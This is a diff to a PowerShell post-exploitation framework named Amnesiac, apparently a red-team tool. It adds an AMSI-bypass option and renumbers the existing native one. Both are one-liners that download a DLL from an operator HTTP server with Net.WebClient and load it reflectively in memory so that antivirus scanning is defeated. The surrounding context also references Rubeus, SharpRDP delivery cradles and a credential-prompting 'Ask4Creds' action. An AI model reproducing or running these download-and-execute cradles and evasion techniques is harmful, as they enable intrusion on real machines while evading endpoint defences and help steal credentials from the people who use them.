@@ -8,6 +8,8 @@ $_alInPS = "JLZn7QzBZS"
 $_alSpwn = "F8VN3g3UuD"
 $_alNL   = "hAdjDGYuHq"
 $_alNLLd = "wciWLtbhch"
+$_alByp  = ""
+$_alPar  = ""
 # !!AL-MAP-END!!
 $global:AmnesiacRoot = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Path }
 
@@ -1082,14 +1084,21 @@ function Amnesiac {
 			$_b2 = Get-AmsiBypassSnippet -Technique 'session'
 			$_b3 = Get-AmsiBypassSnippet -Technique 'split'
 			$_b4 = Get-AmsiBypassSnippet -Technique 'direct'
-			# [5] reflective native DLL: loads AmnesiacLoader (managed, no AMSI scan on bytes)
-			#     then uses NativeLoader to map amsi_bypass.dll entirely in-memory.
+			# [5] reflective managed DLL — loads AmnesiacLoader, calls Bypass.PatchAmsiReflection()
+			#     Pure .NET reflection, no AMSI scan on binary bytes loaded via [Reflection.Assembly]::Load
+			$_b5name = if ($_alByp -and $_alPar) { "$_alNs.$_alByp" } else { "AmnesiacLoader.Bypass (run Build.ps1 to embed names)" }
+			$_b5 = if ($_alByp -and $_alPar) {
+				"`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('$_srv/$_alNs.dll'));`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null)"
+			} else {
+				"(run AmnesiacLoader\Build.ps1 first to populate `$_alByp/`$_alPar names)"
+			}
+			# [6] reflective native DLL: loads AmnesiacLoader then uses NativeLoader to map amsi_bypass.dll in-memory
 			#     No PS reflection on AMSI internals -- PAGE_GUARD VEH installed natively.
-			$_b5 = "`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('$_srv/$_alNs.dll'));`$_a.GetType('$_alNs.$_alNL').GetMethod('$_alNLLd').Invoke(`$null,@(,(New-Object Net.WebClient).DownloadData('$_srv/amsi_bypass.dll')))"
+			$_b6 = "`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('$_srv/$_alNs.dll'));`$_a.GetType('$_alNs.$_alNL').GetMethod('$_alNLLd').Invoke(`$null,@(,(New-Object Net.WebClient).DownloadData('$_srv/amsi_bypass.dll')))"
 			Write-Host ""
 			Write-Host " [+] Assumed Breach Bootstrap — AMSI Bypass Options" -ForegroundColor Cyan
 			Write-Host " [*] Paste ONE bypass into the target PS process, then paste the load command." -ForegroundColor Yellow
-			Write-Host " [*] Try in order — [1] most evasive. [5] native (no PS AMSI reflection at all)." -ForegroundColor Yellow
+			Write-Host " [*] Try in order — [1] most evasive. [6] native (no PS AMSI reflection at all)." -ForegroundColor Yellow
 			Write-Host ""
 			Write-Host " [1] Field-enum via char array (no field/type name literals anywhere):" -ForegroundColor Green
 			Write-Host "     $_b1" -ForegroundColor Gray
@@ -1103,9 +1112,13 @@ function Amnesiac {
 			Write-Host " [4] Direct AmsiScanBuffer patch (no AMSI reflection, requires Add-Type):" -ForegroundColor Green
 			Write-Host "     $_b4" -ForegroundColor Gray
 			Write-Host ""
-			Write-Host " [5] Native PAGE_GUARD VEH — reflective DLL load, zero PS AMSI reflection:" -ForegroundColor Green
-			Write-Host "     (Requires $_alNs.dll + amsi_bypass.dll served by 'serve')" -ForegroundColor DarkYellow
+			Write-Host " [5] Managed reflection — load AmnesiacLoader.dll, call $_b5name::$_alPar():" -ForegroundColor Green
+			Write-Host "     (Requires $_alNs.dll served by 'serve' or GitHub Releases)" -ForegroundColor DarkYellow
 			Write-Host "     $_b5" -ForegroundColor Gray
+			Write-Host ""
+			Write-Host " [6] Native PAGE_GUARD VEH — reflective DLL load, zero PS AMSI reflection:" -ForegroundColor Green
+			Write-Host "     (Requires $_alNs.dll + amsi_bypass.dll served by 'serve')" -ForegroundColor DarkYellow
+			Write-Host "     $_b6" -ForegroundColor Gray
 			Write-Host ""
 			Write-Host " [*] Then load Amnesiac (operator HTTP server):" -ForegroundColor Cyan
 			Write-Host "     $_load" -ForegroundColor White
@@ -1997,6 +2010,7 @@ function Start-LocalShell {
             Write-Host "   RunBin <name>     " -NoNewline -ForegroundColor Yellow; Write-Host "Reflectively load .NET assembly from cache/server - use: RunBin Rubeus.exe triage"
             Write-Host "   serve             " -NoNewline -ForegroundColor Yellow; Write-Host "Start operator HTTP server (for SharpRDP cradle delivery; not needed for winrm)"
             Write-Host "   servelog          " -NoNewline -ForegroundColor Yellow; Write-Host "Show HTTP access log from running serve"
+            Write-Host "   bootstrap         " -NoNewline -ForegroundColor Cyan;   Write-Host "Scenario 2: show AMSI bypass options + iex load command for assumed breach"
             Write-Output ""
             Write-Host " [+] Local Actions:" -ForegroundColor Green
             Write-Host "   Ask4Creds         " -NoNewline -ForegroundColor Yellow; Write-Host "Prompt user for credentials"
